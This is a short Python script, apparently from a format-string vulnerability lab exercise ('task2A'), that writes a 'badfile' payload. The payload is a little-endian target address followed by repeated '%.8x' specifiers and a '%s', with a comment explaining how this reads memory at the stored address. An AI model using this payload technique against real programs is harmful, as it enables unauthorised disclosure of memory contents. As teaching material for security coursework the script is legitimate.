#! /usr/bin/python3
import sys

def heap_data(N):
    global content

    address = 0x080b4008
    content[0:4] = (address).to_bytes(4, byteorder='little')

    s = "%.8x "*(N-1) + "%s\n"
    fmt = (s).encode('latin-1')
    content[4:4+len(fmt)] = fmt


N = 1500
content = bytearray(0x0 for i in range(N))

heap_data(int(sys.argv[1]))

with open('badfile', 'wb') as f:
    f.write(content)

"""
In task2A we see that with 64 cells we can see our input in the stack
so using heap_data(), we save the address of where we want access in first 4 cells
and then when we reach that cells (after 63 %.8x), we sue %s to access the address we saved in the first 4 cells
"""